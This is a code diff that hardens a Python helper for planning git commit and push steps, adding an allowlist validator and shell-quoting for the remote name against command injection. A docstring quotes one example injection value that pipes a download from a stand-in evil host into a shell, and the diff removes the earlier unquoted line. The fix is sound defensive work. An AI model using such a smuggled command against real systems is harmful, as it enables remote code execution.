@@ -148,6 +148,26 @@ def _shell_quote(value: str) -> str:
     return "'" + value.replace("'", "'\\''") + "'"
 
 
+# A git remote is either a short name (origin, upstream) or a URL. This allowlist
+# admits both while rejecting shell metacharacters — defense in depth so a bad
+# value can never reach the worker's shell-string command even if quoting were to
+# regress. (No spaces, ``;``, ``|``, ``&``, ``$``, backticks, quotes, parens.)
+_REMOTE_RE = re.compile(r"^[A-Za-z0-9._:@/\-]+$")
+
+
+def _validate_remote(remote: str) -> str:
+    """Return *remote* if it is a safe git remote name/URL, else raise.
+
+    The worker executes ``git push {args}`` as a SHELL STRING, so an unvalidated,
+    caller-supplied remote (e.g. ``origin; curl evil|sh #``) would be command
+    injection. This is the first of two gates; ``plan_commit_push`` also quotes.
+    """
+    value = (remote or "").strip()
+    if not value or not _REMOTE_RE.match(value):
+        raise ValueError(f"Invalid git remote: {remote!r}")
+    return value
+
+
 @dataclass(frozen=True)
 class GitStep:
     """One ``workspace_git`` invocation: operation + arg string."""
@@ -168,15 +188,20 @@ def plan_commit_push(
     upstream so the PR-open link works. The commit message is passed as an
     already-resolved, EDITABLE string (the UI supplies it).
 
-    Token handling is NOT in the plan — the push token is injected server-side at
-    execution against the resolved remote URL (build_authenticated_remote) and
-    never appears in these args or in logs.
+    Security: the worker runs these arg strings as a SHELL command
+    (``git {operation} {args}`` → ``execute_command``), so EVERY interpolated
+    value (branch, message, AND remote) is single-quoted, and ``remote`` is
+    additionally allowlist-validated (``_validate_remote``) — two gates against
+    command injection. Token handling is NOT in the plan — the push token is
+    injected server-side against the resolved remote URL
+    (``build_authenticated_remote``) and never appears in these args or logs.
     """
     branch = canvas_branch_name(session_id)
     msg = commit_message.strip() or "chore: canvas session changes"
+    safe_remote = _validate_remote(remote)
     return [
         GitStep("checkout", f"-B {_shell_quote(branch)}"),
         GitStep("add", "-A"),
         GitStep("commit", f"-m {_shell_quote(msg)}"),
-        GitStep("push", f"-u {remote} {_shell_quote(branch)}"),
+        GitStep("push", f"-u {_shell_quote(safe_remote)} {_shell_quote(branch)}"),
     ]
